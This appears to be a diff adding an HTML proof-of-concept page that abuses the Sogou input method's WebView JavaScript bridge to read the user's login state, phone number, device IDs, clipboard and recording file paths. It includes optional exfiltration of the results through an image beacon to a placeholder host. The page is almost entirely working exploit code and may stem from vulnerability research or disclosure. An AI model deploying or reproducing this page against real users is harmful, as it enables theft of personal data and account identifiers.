@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sogou IME Bridge Probe</title>
+<style>
+  body { font-family: -apple-system, "PingFang SC", sans-serif; background:#101018; color:#eee;
+         margin:0; padding:12px; }
+  h1 { font-size:16px; margin:4px 0; }
+  h2 { font-size:13px; color:#8be08b; margin:14px 0 4px; }
+  pre { background:#1c1c2a; border:1px solid #333; border-radius:8px; padding:8px;
+        font-size:11px; white-space:pre-wrap; word-break:break-all; margin:4px 0; }
+  button { padding:8px 12px; margin:4px 6px 4px 0; border:none; border-radius:8px;
+           background:#5c8ae0; color:#fff; font-size:13px; }
+  .ok  { color:#8be08b; } .err { color:#e08b8b; }
+</style>
+</head>
+<body>
+<h1>搜狗输入法 JS 桥信息窃取 PoC (◕‿◕)</h1>
+<p style="font-size:11px;color:#9aa0b4" id="bridge-state">检测 SogouHotwordsUtils ...</p>
+
+<h2>1. getLoginState('') — 账号登录态 (含 sgid/userid/sgunionid/手机号)</h2>
+<pre id="r-login">(waiting)</pre>
+
+<h2>2. getUniqueId() — md5(AndroidID)+sogouUid</h2>
+<pre id="r-uid">(waiting)</pre>
+
+<h2>3. getSogouAndroidId() — 设备标识</h2>
+<pre id="r-aid">(waiting)</pre>
+
+<h2>4. getQ36()</h2>
+<pre id="r-q36">(waiting)</pre>
+
+<h2>5. getHotwordsSDKUA() / 环境</h2>
+<pre id="r-ua">(waiting)</pre>
+
+<h2>6. 手动触发的回调型方法</h2>
+<button id="btn-clip">requestClipBoardText</button>
+<button id="btn-phone">getPhoneNumber</button>
+<button id="btn-record">getRecordFilePath</button>
+<pre id="r-cb">(点击按钮触发)</pre>
+
+<script>
+(function () {
+  // 可选: 把窃取结果回传攻击者服务器(Image beacon)。留空则不回传, 只在页面展示。
+  var EXFIL_URL = ''; // 例如: 'https://YOUR-HOST/collect?d='
+
+  var S = window.SogouHotwordsUtils;
+  var stateEl = document.getElementById('bridge-state');
+
+  function show(id, label, value) {
+    var el = document.getElementById(id);
+    try {
+      var text = (typeof value === 'string') ? value : JSON.stringify(value, null, 2);
+      el.textContent = text;
+      el.className = 'ok';
+    } catch (e) {
+      el.textContent = String(value);
+    }
+    if (EXFIL_URL) {
+      new Image().src = EXFIL_URL + encodeURIComponent(label + '=' + (el.textContent || ''));
+    }
+    return el.textContent;
+  }
+
+  function reportErr(id, e) {
+    var el = document.getElementById(id);
+    el.textContent = '[exception] ' + e;
+    el.className = 'err';
+  }
+
+  if (!S) {
+    stateEl.textContent = '[-] window.SogouHotwordsUtils 不存在 —— 页面不在搜狗 H5 WebView 内加载';
+    return;
+  }
+  stateEl.textContent = '[+] SogouHotwordsUtils 可用! 桥方法数: ' +
+    Object.keys(Object.getPrototypeOf(S)).filter(function (k) { return typeof S[k] === 'function'; }).length;
+
+  // ---- 同步方法, 逐个尝试 ----
+  try { show('r-login', 'login', S.getLoginState('')); }
+  catch (e) { reportErr('r-login', e); }
+
+  try { show('r-uid', 'uniqueId', S.getUniqueId()); }
+  catch (e) { reportErr('r-uid', e); }
+
+  try { show('r-aid', 'androidId', S.getSogouAndroidId()); }
+  catch (e) { reportErr('r-aid', e); }
+
+  try { show('r-q36', 'q36', S.getQ36()); }
+  catch (e) { reportErr('r-q36', e); }
+
+  var ua = '';
+  try { ua = S.getHotwordsSDKUA(); } catch (e) { ua = '(unavailable)'; }
+  show('r-ua', 'ua', ua + '\n\nnavigator.userAgent:\n' + navigator.userAgent);
+
+  // ---- 回调型方法: 桥以 javascript:<cb>(json) 方式调用全局函数 ----
+  window.pocClipCb = function (r) { show('r-cb', 'clip', 'requestClipBoardText → ' + JSON.stringify(r)); };
+  window.pocPhoneCb = function (r) { show('r-cb', 'phone', 'getPhoneNumber → ' + JSON.stringify(r)); };
+  window.pocRecordCb = function (r) { show('r-cb', 'record', 'getRecordFilePath → ' + JSON.stringify(r)); };
+
+  document.getElementById('btn-clip').addEventListener('click', function () {
+    try { S.requestClipBoardText('pocClipCb'); } catch (e) { reportErr('r-cb', e); }
+  });
+  document.getElementById('btn-phone').addEventListener('click', function () {
+    try { S.getPhoneNumber('pocPhoneCb'); } catch (e) { reportErr('r-cb', e); }
+  });
+  document.getElementById('btn-record').addEventListener('click', function () {
+    try { S.getRecordFilePath('pocRecordCb'); } catch (e) { reportErr('r-cb', e); }
+  });
+})();
+</script>
+</body>
+</html>
